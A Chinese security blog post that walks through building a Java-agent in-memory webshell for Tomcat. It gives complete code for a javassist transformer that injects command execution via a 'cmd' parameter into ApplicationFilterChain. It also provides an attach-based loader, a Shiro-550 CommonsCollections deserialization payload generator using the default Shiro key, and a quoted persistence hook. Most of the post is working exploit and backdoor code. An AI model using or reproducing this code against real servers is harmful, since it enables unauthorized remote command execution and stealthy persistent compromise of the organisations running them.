---
title: "Java Agent实现反序列化注入内存shell"
date: 2020-09-30T11:24:47+08:00
draft: false
tags:
- shell
- 反序列化
- Java
- Agent
- 内存马
series:
-
categories:
- 代码审计
---

本文将要讲解的是通过Java agent拦截修改关键类的字节码，最大程度实现一套代码通用注入内存shell。
<!--more-->

# 简述内存shell

Java内存shell有很多种，大致分为：

1. 动态注册servlet
2. 动态注册filter
3. 动态注册listener
4. 基于Java agent拦截修改关键类字节码实现内存shell

前三种方法在 [《JSP Webshell那些事 -- 攻击篇(下)》](https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w) 一文中均有讲解，但是前三种方法均需要对中间件大量调试，反射调用一步一步的链条，对于大型中间件比如weblogic这种比较麻烦，无法实现一套代码通用。

那么本文将要讲解的最后一种方法，通过拦截修改关键类的字节码，只需要寻找到关键类做处理即可，进而最大程度实现一套代码通用（理论上）。

# 简单认识Java Agent
在jdk的rt.jar包中存在一个`java.lang.instrument`包，该包提供了一些工具帮助开发人员在 Java 程序运行时，动态修改系统中的 Class 类型。其中，使用该软件包的一个关键组件就是 Javaagent。从名字上看，似乎是个 Java 代理之类的，而实际上，他的功能更像是一个Class 类型的转换器，他可以在运行时接受重新外部请求，对Class类型进行修改。

Javaagent是java命令的一个参数。参数 javaagent 可以用于指定一个 jar 包，并且对该 java 包有2个要求：
1. 这个 jar 包的 `MANIFEST.MF` 文件必须指定 `Premain-Class` 项。
2. `Premain-Class` 指定的那个类必须实现 premain() 方法。

JVM启动时会优先加载agent里面的东西，我们写一个简单的agent来看一下。

项目结构

```bash
└───src
    └───org
        └───chabug
                Agent.java
                DefineTransformer.java
```

org.chabug.Agent.java

```java
package org.chabug;

import java.lang.instrument.Instrumentation;

public class Agent {
    public static void premain(String agentArgs, Instrumentation inst) {
        System.out.println("agentArgs : " + agentArgs);
        inst.addTransformer(new DefineTransformer(), true);
    }
}
```

org.chabug.DefineTransformer.java

```java
package org.chabug;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class DefineTransformer implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        System.out.println("premain load Class:" + className);
        return new byte[0];
    }
}
```

然后配置打包文件`src\META-INF\MANIFEST.MF`

```yaml
Manifest-Version: 1.0
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Premain-Class: org.chabug.Agent

```
idea打包为jar文件之后，创建一个新的类`org.chabug.Main`测试agent

```java
package org.chabug;

public class Main {
    public static void main(String[] args) {
        System.out.println("thisismain");
    }
}
```

idea设置运行时vm参数`-javaagent:out\artifacts\TestAgent_jar\TestAgent.jar`
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/aabc9058-b9af-8553-d97b-974d8bcc5a82.png)

运行结果

```text
agentArgs : null
premain load Class:java/util/concurrent/ConcurrentHashMap$ForwardingNode
premain load Class:sun/misc/URLClassPath$JarLoader$2
premain load Class:java/util/jar/Attributes
premain load Class:java/util/jar/Manifest$FastInputStream
premain load Class:java/lang/StringCoding
premain load Class:java/lang/StringCoding$StringDecoder
premain load Class:java/util/jar/Attributes$Name
premain load Class:sun/misc/ASCIICaseInsensitiveComparator
premain load Class:com/intellij/rt/execution/application/AppMainV2$Agent
premain load Class:com/intellij/rt/execution/application/AppMainV2
premain load Class:com/intellij/rt/execution/application/AppMainV2$1
premain load Class:java/lang/reflect/InvocationTargetException
premain load Class:java/lang/NoSuchMethodException
premain load Class:java/net/Socket
premain load Class:java/net/InetSocketAddress
premain load Class:java/net/SocketAddress
premain load Class:java/net/InetAddress
premain load Class:java/net/InetSocketAddress$InetSocketAddressHolder
premain load Class:sun/security/action/GetBooleanAction
premain load Class:java/lang/invoke/MethodHandleImpl
premain load Class:java/net/InetAddress$1
premain load Class:java/lang/invoke/MethodHandleImpl$1
premain load Class:java/lang/invoke/MethodHandleImpl$2
premain load Class:java/util/function/Function
premain load Class:java/net/InetAddress$InetAddressHolder
premain load Class:java/net/InetAddress$Cache
premain load Class:java/net/InetAddress$Cache$Type
premain load Class:java/net/InetAddressImplFactory
premain load Class:java/lang/invoke/MethodHandleImpl$3
premain load Class:java/lang/invoke/MethodHandleImpl$4
premain load Class:java/lang/ClassValue
premain load Class:java/net/Inet6AddressImpl
premain load Class:java/lang/ClassValue$Entry
premain load Class:java/net/InetAddressImpl
premain load Class:java/lang/ClassValue$Identity
premain load Class:java/lang/ClassValue$Version
premain load Class:java/lang/invoke/MemberName$Factory
premain load Class:java/net/InetAddress$2
premain load Class:java/lang/invoke/MethodHandleStatics
premain load Class:sun/net/spi/nameservice/NameService
premain load Class:java/lang/invoke/MethodHandleStatics$1
premain load Class:java/net/Inet4Address
premain load Class:java/net/SocksSocketImpl
premain load Class:java/net/SocksConsts
premain load Class:sun/misc/PostVMInitHook
premain load Class:java/net/PlainSocketImpl
premain load Class:sun/misc/PostVMInitHook$2
premain load Class:java/net/AbstractPlainSocketImpl
premain load Class:jdk/internal/util/EnvUtils
premain load Class:sun/misc/PostVMInitHook$1
premain load Class:java/net/SocketImpl
premain load Class:java/net/SocketOptions
premain load Class:sun/usagetracker/UsageTrackerClient
premain load Class:java/net/AbstractPlainSocketImpl$1
premain load Class:java/util/concurrent/atomic/AtomicBoolean
premain load Class:sun/usagetracker/UsageTrackerClient$1
premain load Class:java/net/PlainSocketImpl$1
premain load Class:sun/usagetracker/UsageTrackerClient$4
premain load Class:sun/misc/FloatingDecimal
premain load Class:sun/usagetracker/UsageTrackerClient$2
premain load Class:sun/misc/FloatingDecimal$ExceptionalBinaryToASCIIBuffer
premain load Class:sun/misc/FloatingDecimal$BinaryToASCIIConverter
premain load Class:sun/usagetracker/UsageTrackerClient$3
premain load Class:sun/misc/FloatingDecimal$BinaryToASCIIBuffer
premain load Class:sun/misc/FloatingDecimal$1
premain load Class:sun/misc/FloatingDecimal$PreparedASCIIToBinaryBuffer
premain load Class:sun/misc/FloatingDecimal$ASCIIToBinaryConverter
premain load Class:sun/misc/FloatingDecimal$ASCIIToBinaryBuffer
premain load Class:java/net/DualStackPlainSocketImpl
premain load Class:java/lang/StringCoding$StringEncoder
premain load Class:java/net/Inet6Address
premain load Class:java/io/FileOutputStream$1
premain load Class:java/net/Inet6Address$Inet6AddressHolder
premain load Class:sun/launcher/LauncherHelper
premain load Class:java/net/SocksSocketImpl$3
premain load Class:sun/nio/cs/MS1252
premain load Class:java/net/ProxySelector
premain load Class:sun/nio/cs/SingleByte
premain load Class:sun/net/spi/DefaultProxySelector
premain load Class:sun/nio/cs/SingleByte$Decoder
premain load Class:sun/net/spi/DefaultProxySelector$1
premain load Class:sun/net/NetProperties
premain load Class:sun/net/NetProperties$1
premain load Class:org/chabug/Main
premain load Class:sun/launcher/LauncherHelper$FXHelper
premain load Class:java/util/Properties$LineReader
premain load Class:java/lang/Class$MethodArray
premain load Class:java/lang/Void
thisismain
premain load Class:java/lang/Shutdown
premain load Class:java/net/URI
premain load Class:java/lang/Shutdown$Lock
```

可以看到agent的`org.chabug.Agent#premain`优于Main方法而先被运行，并且在`org.chabug.DefineTransformer#transform`获取到了JVM加载的类。

那么思路回到内存shell的思路中，如果我们把这个agent加载到jvm中，那么就可以通过javassist进行字节码插桩，修改tomcat的filter实现类，从而实现内存马。

现在的问题就在于：

1. javassist 应该修改哪个关键类？
2. 如何指定运行时tomcat的`-javaagent`参数？
3. 如何修改tomcat运行后已经加载的类？
4. 如何通过反序列化注入


# 寻找关键类
tomcat filter内存shell有无数的分析文章，其中大部分都提到了一个关键类`org.apache.catalina.core.ApplicationFilterChain#doFilter`
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/02f7b000-46b4-ebb6-208c-fbc57bd4fab2.png)

该方法有ServletRequest和ServletResponse两个参数，里面封装了请求的request和response。另外，internalDoFilter方法是自定义filter的入口，如果在这里拦截，那么filter既通用，又不影响正常业务。


来写agent

```java
package org.chabug;

import java.lang.instrument.Instrumentation;

public class MyAgent {
    // tomcat FilterChain
    public static String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        inst.addTransformer(new MyTransformer(), true);
        Class[] loadedClasses = inst.getAllLoadedClasses();

        for (int i = 0; i < loadedClasses.length; ++i) {
            Class clazz = loadedClasses[i];
            if (clazz.getName().equals(ClassName)) {
                try {
                    inst.retransformClasses(new Class[]{clazz});
                } catch (Exception var9) {
                    var9.printStackTrace();
                }
            }
        }
//        System.out.println("agent done");
    }

    public static void premain(String args, Instrumentation inst) throws Exception {

    }
}
```

定义transform

```java
package org.chabug;

import javassist.*;

import java.io.IOException;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class MyTransformer implements ClassFileTransformer {
    public static String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> aClass, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
        className = className.replace('/', '.');

        if (className.equals(ClassName)) {
//            System.out.println(":::::::::::::::::::find shiro ApplicationFilterChain:" + className);
            ClassPool cp = ClassPool.getDefault();
            if (aClass != null) {
                ClassClassPath classPath = new ClassClassPath(aClass);
                cp.insertClassPath(classPath);
            }
            CtClass cc;
            try {
                cc = cp.get(className);
                CtMethod m = cc.getDeclaredMethod("doFilter");
                m.insertBefore(" javax.servlet.ServletRequest req = request;\n" +
                        "            javax.servlet.ServletResponse res = response;" +
                        "String cmd = req.getParameter(\"cmd\");\n" +
                        "if (cmd != null) {\n" +
                        "Process process = Runtime.getRuntime().exec(cmd);\n" +
                        "java.io.BufferedReader bufferedReader = new java.io.BufferedReader(\n" +
                        "new java.io.InputStreamReader(process.getInputStream()));\n" +
                        "StringBuilder stringBuilder = new StringBuilder();\n" +
                        "String line;\n" +
                        "while ((line = bufferedReader.readLine()) != null) {\n" +
                        "stringBuilder.append(line + '\\n');\n" +
                        "}\n" +
                        "res.getOutputStream().write(stringBuilder.toString().getBytes());\n" +
                        "res.getOutputStream().flush();\n" +
                        "res.getOutputStream().close();\n" +
                        "}");
                byte[] byteCode = cc.toBytecode();
                cc.detach();
                return byteCode;
            } catch (NotFoundException | IOException | CannotCompileException e) {
                e.printStackTrace();
//                System.out.println("error:::::::::::::::::::::" + e.getMessage());
            }
        }

        return new byte[0];
    }
}
```

# 如何指定`-javaagent`参数
tomcat运行前我们无法控制命令行参数，但是运行时JVM提供了`com.sun.tools.attach.VirtualMachine`的api，可以通过这个类attach jvm，然后通过`loadAgent()`函数把agent加载进去。

然后在这里又碰到了坑，`com.sun.tools.attach.VirtualMachine`这个类是JDK的`C:\Program Files\Java\jdk1.8.0_251\lib\tools.jar`包中，在tomcat运行时是jre环境，获取不到这个类。我的办法是通过URLClassLoader加载`java.home`拼接出来的jar包路径，然后反射获取类和方法。

实现代码

```java
package org.chabug;

public class Main {
    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            return;
        }
        String agentPath = args[0];
        try {
            java.io.File toolsJar = new java.io.File(System.getProperty("java.home").replaceFirst("jre", "lib") + java.io.File.separator + "tools.jar");
            java.net.URLClassLoader classLoader = (java.net.URLClassLoader) java.lang.ClassLoader.getSystemClassLoader();
            java.lang.reflect.Method add = java.net.URLClassLoader.class.getDeclaredMethod("addURL", new java.lang.Class[]{java.net.URL.class});
            add.setAccessible(true);
            add.invoke(classLoader, new Object[]{toolsJar.toURI().toURL()});
            Class<?> MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class<?> MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method list = MyVirtualMachine.getDeclaredMethod("list", new java.lang.Class[]{});
            java.util.List<Object> invoke = (java.util.List<Object>) list.invoke(null, new Object[]{});
//            System.out.println(invoke);

            for (int i = 0; i < invoke.size(); i++) {
                Object o = invoke.get(i);
                java.lang.reflect.Method displayName = o.getClass().getSuperclass().getDeclaredMethod("displayName", new Class[]{});
                Object name = displayName.invoke(o, new Object[]{});
                System.out.println(String.format("find jvm process name:[[[" +
                        "%s" +
                        "]]]", name.toString()));
                if (name.toString().contains("org.apache.catalina.startup.Bootstrap")) {
                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach", new Class[]{MyVirtualMachineDescriptor});
                    Object machine = attach.invoke(MyVirtualMachine, new Object[]{o});
                    java.lang.reflect.Method loadAgent = machine.getClass().getSuperclass().getSuperclass().getDeclaredMethod("loadAgent", new Class[]{String.class});
                    loadAgent.invoke(machine, new Object[]{agentPath});
                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach", new Class[]{});
                    detach.invoke(machine, new Object[]{});
                    System.out.println("inject tomcat done, break.");
                    System.out.println("check url http://localhost:8080/?cmd=whoami");
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

运行这个类，传入agentPath就可以注入agent了。

在这里还碰到一个坑:`VirtualMachine.list()`获取为空，后来发现双击tomcat的startup.bat启动，在jconsole中也找不到jvm进程，然后一顿乱试发现通过命令行运行startup.bat就可以了。

# 如何修改tomcat运行后已经加载的类
其实这个问题在上面写agent的时候已经解决了，关键代码

```java
Class[] loadedClasses = inst.getAllLoadedClasses();

for (int i = 0; i < loadedClasses.length; ++i) {
    Class clazz = loadedClasses[i];
    if (clazz.getName().equals(ClassName)) {
        try {
            inst.retransformClasses(new Class[]{clazz});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
通过`Instrumentation`的`getAllLoadedClasses()`就能拿到tomcat运行后已经加载的类，再通过`retransformClasses()`重新转换下就可以了。

# 如何通过反序列化注入
我这里是shiro550 tomcat9的环境，根据 https://github.com/feihong-cs/ShiroExploit 的ysoserial工具抠出来CC10的链条，改了改。

```java
package org.chabug.demo;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.util.Reflections;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.lang.reflect.Field;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

// 依赖 commons-collections:commons-collections:3.2.1
// 依赖于 ysoserial javassist
public class CC10 {

    static {
        System.setProperty("jdk.xml.enableTemplatesImplDeserialization", "true");
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static Object createTemplatesImpl(String command) throws Exception {
        return Boolean.parseBoolean(System.getProperty("properXalan", "false")) ? createTemplatesImpl(command, Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"), Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl")) : createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }

    public static <T> T createTemplatesImpl(String agentPath, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
        T templates = tplClass.newInstance();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        CtClass clazz = pool.get(StubTransletPayload.class.getName());
        String cmd = String.format(
                "        try {\n" +
                        "java.io.File toolsJar = new java.io.File(System.getProperty(\"java.home\").replaceFirst(\"jre\", \"lib\") + java.io.File.separator + \"tools.jar\");\n" +
                        "java.net.URLClassLoader classLoader = (java.net.URLClassLoader) java.lang.ClassLoader.getSystemClassLoader();\n" +
                        "java.lang.reflect.Method add = java.net.URLClassLoader.class.getDeclaredMethod(\"addURL\", new java.lang.Class[]{java.net.URL.class});\n" +
                        "add.setAccessible(true);\n" +
                        "            add.invoke(classLoader, new Object[]{toolsJar.toURI().toURL()});\n" +
                        "Class/*<?>*/ MyVirtualMachine = classLoader.loadClass(\"com.sun.tools.attach.VirtualMachine\");\n" +
                        "            Class/*<?>*/ MyVirtualMachineDescriptor = classLoader.loadClass(\"com.sun.tools.attach.VirtualMachineDescriptor\");" +
                        "java.lang.reflect.Method list = MyVirtualMachine.getDeclaredMethod(\"list\", null);\n" +
                        "            java.util.List/*<Object>*/ invoke = (java.util.List/*<Object>*/) list.invoke(null, null);" +
                        "for (int i = 0; i < invoke.size(); i++) {" +
                        "Object o = invoke.get(i);\n" +
                        "                java.lang.reflect.Method displayName = o.getClass().getSuperclass().getDeclaredMethod(\"displayName\", null);\n" +
                        "                Object name = displayName.invoke(o, null);\n" +
                        "if (name.toString().contains(\"org.apache.catalina.startup.Bootstrap\")) {" +
                        "                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod(\"attach\", new Class[]{MyVirtualMachineDescriptor});\n" +
                        "                    Object machine = attach.invoke(MyVirtualMachine, new Object[]{o});\n" +
                        "                    java.lang.reflect.Method loadAgent = machine.getClass().getSuperclass().getSuperclass().getDeclaredMethod(\"loadAgent\", new Class[]{String.class});\n" +
                        "                    loadAgent.invoke(machine, new Object[]{\"%s\"});\n" +
                        "                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod(\"detach\", null);\n" +
                        "                    detach.invoke(machine, null);\n" +
                        "                    break;\n" +
                        "}" +
                        "}" +
                        "} catch (Exception e) {\n" +
                        "            e.printStackTrace();\n" +
                        "        }"
                , agentPath.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\""));

        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);
        byte[] classBytes = clazz.toBytecode();
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, classAsBytes(Foo.class)});
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    public static String classAsFile(Class<?> clazz) {
        return classAsFile(clazz, true);
    }

    public static String classAsFile(Class<?> clazz, boolean suffix) {
        String str;
        if (clazz.getEnclosingClass() == null) {
            str = clazz.getName().replace(".", "/");
        } else {
            str = classAsFile(clazz.getEnclosingClass(), false) + "$" + clazz.getSimpleName();
        }

        if (suffix) {
            str = str + ".class";
        }

        return str;
    }

    public static byte[] classAsBytes(Class<?> clazz) {
        try {
            byte[] buffer = new byte[1024];
            String file = classAsFile(clazz);
            InputStream in = CC10.class.getClassLoader().getResourceAsStream(file);
            if (in == null) {
                throw new IOException("couldn't find '" + file + "'");
            } else {
                ByteArrayOutputStream out = new ByteArrayOutputStream();

                int len;
                while ((len = in.read(buffer)) != -1) {
                    out.write(buffer, 0, len);
                }

                return out.toByteArray();
            }
        } catch (IOException var6) {
            throw new RuntimeException(var6);
        }
    }


    public static void main(String[] args) throws Exception {
        // this is your agent path
        String command = "E:\\code\\java\\MyAgent\\out\\artifacts\\MyAgent_jar\\MyAgent.jar";
        Object templates = createTemplatesImpl(command);
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, templates);
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;

        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException var17) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = null;
        innimpl = (HashMap) f.get(map);
        Field f2 = null;

        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException var16) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = new Object[0];
        array = (Object[]) ((Object[]) f2.get(innimpl));
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;

        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception var15) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        byte[] bytes = Serializables.serializeToBytes(map);
        String key = "kPH+bIxk5D2deZiIxcaaaA==";
        String rememberMe = EncryptUtil.shiroEncrypt(key, bytes);
        System.out.println(rememberMe);
    }

    public static class Foo implements Serializable {
        private static final long serialVersionUID = 8207363842866235160L;

        public Foo() {
        }
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
        private static final long serialVersionUID = -5971610431559700674L;

        public StubTransletPayload() {
        }

        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }

        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }


}

class Serializables {
    public static byte[] serializeToBytes(final Object obj) throws Exception {
        final ByteArrayOutputStream out = new ByteArrayOutputStream();
        final ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        objOut.flush();
        objOut.close();
        return out.toByteArray();
    }


    public static Object deserializeFromBytes(final byte[] serialized) throws Exception {
        final ByteArrayInputStream in = new ByteArrayInputStream(serialized);
        final ObjectInputStream objIn = new ObjectInputStream(in);
        return objIn.readObject();
    }

    public static void serializeToFile(String path, Object obj) throws Exception {
        FileOutputStream fos = new FileOutputStream("object");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        //writeObject()方法将obj对象写入object文件
        os.writeObject(obj);
        os.close();
    }

    public static Object serializeFromFile(String path) throws Exception {
        FileInputStream fis = new FileInputStream(path);
        ObjectInputStream ois = new ObjectInputStream(fis);
        // 通过Object的readObject()恢复对象
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }

}


class EncryptUtil {
    private static final String ENCRY_ALGORITHM = "AES";
    private static final String CIPHER_MODE = "AES/CBC/PKCS5Padding";
    private static final byte[] IV = "aaaaaaaaaaaaaaaa".getBytes();     // 16字节IV

    public EncryptUtil() {
    }

    public static byte[] encrypt(byte[] clearTextBytes, byte[] pwdBytes) {
        try {
            SecretKeySpec keySpec = new SecretKeySpec(pwdBytes, ENCRY_ALGORITHM);
            Cipher cipher = Cipher.getInstance(CIPHER_MODE);
            IvParameterSpec iv = new IvParameterSpec(IV);
            cipher.init(1, keySpec, iv);
            byte[] cipherTextBytes = cipher.doFinal(clearTextBytes);
            return cipherTextBytes;
        } catch (NoSuchPaddingException var6) {
            var6.printStackTrace();
        } catch (NoSuchAlgorithmException var7) {
            var7.printStackTrace();
        } catch (BadPaddingException var8) {
            var8.printStackTrace();
        } catch (IllegalBlockSizeException var9) {
            var9.printStackTrace();
        } catch (InvalidKeyException var10) {
            var10.printStackTrace();
        } catch (Exception var11) {
            var11.printStackTrace();
        }

        return null;
    }

    public static String shiroEncrypt(String key, byte[] objectBytes) {
        byte[] pwd = Base64.decode(key);
        byte[] cipher = encrypt(objectBytes, pwd);

        assert cipher != null;

        byte[] output = new byte[pwd.length + cipher.length];
        byte[] iv = IV;
        System.arraycopy(iv, 0, output, 0, iv.length);
        System.arraycopy(cipher, 0, output, pwd.length, cipher.length);
        return Base64.encode(output);
    }
}
```

在javassist插桩的时候碰到很多坑，比如泛型要用`/**/`包起来，反射的可变参数的处理等等，不一一细讲，参考我的代码就行了。

# 效果
![shell.gif](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/21f519ec-a731-13c4-eb06-60d03b75fc67.gif)

项目地址：https://github.com/Y4er/javaagent-tomcat-memshell

# 思考
写到这里又看了一些文章，发现了一些问题。

## 内存shell复活

@rebeyond 师傅的memShell项目实现了内存shell复活，原理是通过设置Java虚拟机的关闭钩子ShutdownHook来达到这个目的，但是会有一个jar包循环等待jvm进程起来，更敏感，我就没实现这个东西，代码贴出来

```java
public static void persist() {
     try {
         Thread t = new Thread() {
             public void run() {
                 try {
                     writeFiles("inject.jar",Agent.injectFileBytes);
                     writeFiles("agent.jar",Agent.agentFileBytes);
                     startInject();
                 } catch (Exception e) {

                 }
             }
         };
         t.setName("shutdown Thread");
         Runtime.getRuntime().addShutdownHook(t);
     } catch (Throwable t) {
     }
}
```
JVM关闭前，会先调用writeFiles把inject.jar和agent.jar写到磁盘上，然后调用startInject，startInject通过Runtime.exec启动`java -jar inject.jar`。

## 文件落地并且被锁定
用javaagent的形式实现的内存shell，你需要落地一个agent进去，加载agent之后jar不能被删除，而落地agent会不会更敏感？

与其落地文件为什么不直接落地jsp shell，获取对于mvc和springboot这种有点作用，但是内存shell的意义确实被削弱了。

## 通用性
只需要寻找关键类即可，对于tomcat、weblogic这种还算通用，完全可以实现一个agent.jar通杀。

## 关键类寻找
如果关键类找不对，或者错了几个参数的命名，那么中间件正常处理filter的逻辑很可能发生错误，中间件很可能被打挂。虽然可以本地环境调试，但是每个发行版不同、补丁数的不同所带来的不稳定因素还是很大的。

## 结论
所以个人而言，agent类型的内存shell只能作为内存shell的一种开拓性思路，实际环境更应该倾向于servlet、filter这种内存shell，重在稳定。

# 参考
1. https://www.cnblogs.com/rebeyond/p/9686213.html
2. https://github.com/rebeyond/memShell
3. https://www.cnblogs.com/rickiyang/p/11368932.html
4. https://github.com/Y4er/javaagent-tomcat-memshell


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**